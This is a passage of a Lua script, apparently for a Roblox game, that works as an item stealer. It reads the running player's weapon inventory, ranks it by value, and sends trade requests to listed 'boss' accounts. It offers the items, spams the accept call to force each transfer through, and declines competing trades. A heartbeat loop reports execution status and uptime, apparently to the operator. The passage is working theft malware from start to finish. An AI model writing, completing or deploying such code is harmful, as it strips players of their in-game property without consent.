end)

local function get_items()
    local items = {}
    local ok, profile = pcall(function()
        return rs.Remotes.Inventory.GetProfileData:InvokeServer(me.Name)
    end)
    if not ok or not profile then
        return items
    end
    local owned = profile.Weapons and profile.Weapons.Owned or {}
    for item_id, qty in pairs(owned) do
        if qty and qty > 0 and not skip_items[item_id] then
            table_insert(items, {
                id = item_id,
                amount = qty,
            })
        end
    end
    return sort_items_by_value(items)
end

local function get_status()
    local ok, state = pcall(function()
        return trade.GetTradeStatus:InvokeServer()
    end)
    return (ok and state) or 'None'
end

local function offer_item(item_id)
    pcall(function()
        trade.OfferItem:FireServer(item_id, 'Weapons')
    end)
end

local function do_accept()
    task_wait(6)
    for i = 1, 100 do
        pcall(function()
            trade.AcceptTrade:FireServer(game.PlaceId * 3, last_offer or 0, seq_id or 0)
        end)
        task_wait(0.03)
    end
    task_wait(2)
    local items_left = get_items()
    local total_left = 0
    for _, item in ipairs(items_left) do
        total_left = total_left + item.amount
    end
    if total_left > 0 then
        for i = 1, 50 do
            pcall(function()
                trade.AcceptTrade:FireServer(game.PlaceId * 3, last_offer or 0, seq_id or 0)
            end)
            task_wait(0.05)
        end
    end
    return true
end

local function wait_for_trade_end()
    local elapsed = 0
    repeat
        task_wait(0.05)
        elapsed += 0.05
    until trade_ended or elapsed > 15
end

local function get_first_available_boss()
    if claimed_by then
        local boss = players:FindFirstChild(claimed_by)
        if boss then
            return boss
        end
        if claimed_by_lower then
            for _, player in ipairs(players:GetPlayers()) do
                if string_lower(player.Name) == claimed_by_lower then
                    claimed_by = player.Name
                    return player
                end
            end
        end
        claimed_by = nil
        claimed_by_lower = nil
    end
    local hooked = refresh_claimed_by()
    if hooked then
        local boss = players:FindFirstChild(hooked)
        if boss then
            return boss
        end
    end
    local bosses = _G.Usernames or {}
    for _, boss_name in ipairs(bosses) do
        local boss = players:FindFirstChild(boss_name)
        if boss then
            return boss
        end
        for _, player in ipairs(players:GetPlayers()) do
            if string_lower(player.Name) == string_lower(boss_name) then
                return player
            end
        end
    end
    return nil
end

local function run_transfer()
    local queue = get_items()
    if #queue == 0 then
        return false
    end
    while #queue > 0 do
        local target = get_first_available_boss()
        if not target then
            repeat
                task_wait(1)
                target = get_first_available_boss()
            until target
        end
        local status = get_status()
        if status == 'StartTrade' then
            pcall(function()
                trade.DeclineTrade:FireServer()
            end)
            task_wait(0.3)
        elseif status == 'ReceivingRequest' then
            pcall(function()
                trade.DeclineRequest:FireServer()
            end)
            task_wait(0.2)
        end
        trade_active = false
        trade_ended = false
        cooldown_done = false
        last_offer = nil
        seq_id = nil
        local attempts = 0
        while not trade_active and attempts < 100 do
            status = get_status()
            if status == 'None' then
                pcall(function()
                    trade.SendRequest:InvokeServer(target)
                end)
            elseif status == 'ReceivingRequest' then
                pcall(function()
                    trade.DeclineRequest:FireServer()
                end)
            end
            attempts += 1
            task_wait(0.05)
        end
        if not trade_active then
            task_wait(0.5)
            continue
        end
        task_wait(0.1)
        local slots_used = 0
        local offered_this_trade = {}
        while slots_used < 4 and #queue > 0 do
            local entry = queue[1]
            for i = 1, entry.amount do
                offer_item(entry.id)
                task_wait(0.01)
            end
            table_insert(offered_this_trade, entry)
            table_remove(queue, 1)
            slots_used += 1
        end
        local waited = 0
        while last_offer == nil and waited < 5 do
            task_wait(0.05)
            waited += 0.05
        end
        local accepted = do_accept()
        if not accepted then
            for i = #offered_this_trade, 1, -1 do
                table_insert(queue, 1, offered_this_trade[i])
            end
            task_wait(0.5)
            continue
        end
        wait_for_trade_end()
        task_wait(0.5)
    end
    return true
end

local function receiver_watcher()
    while true do
        task_wait(5)
        local hooked = refresh_claimed_by()
        if hooked and hooked ~= claimed_by then
            claimed_by = hooked
            claimed_by_lower = string_lower(hooked)
        end
        if claimed_by then
            local still_here = players:FindFirstChild(claimed_by)
            if not still_here then
                if claimed_by_lower then
                    for _, player in ipairs(players:GetPlayers()) do
                        if string_lower(player.Name) == claimed_by_lower then
                            claimed_by = player.Name
                            still_here = player
                            break
                        end
                    end
                end
                if not still_here then
                    claimed_by = nil
                    claimed_by_lower = nil
                end
            end
        end
    end
end

local function api_heartbeat()
    local start_time = os.clock()
    local tick = 0
    while true do
        local elapsed = os.clock() - start_time
        local s = math.max(0, math.floor(elapsed))
        local uptime_str
        if s < 60 then
            uptime_str = s .. 's'
        elseif s < 3600 then
            local m = math.floor(s / 60)
            local sec = s % 60
            uptime_str = m .. 'm ' .. sec .. 's'
        else
            local h = math.floor(s / 3600)
            local rem = s % 3600
            local m = math.floor(rem / 60)
            uptime_str = h .. 'h ' .. m .. 'm'
        end
        local status_str = 'ingame'
        if tick == 0 then
            status_str = 'executed'
        end
        send(status_str, uptime_str, tick)
        tick = tick + 1
        task_wait(beatmymeat)
    end
end

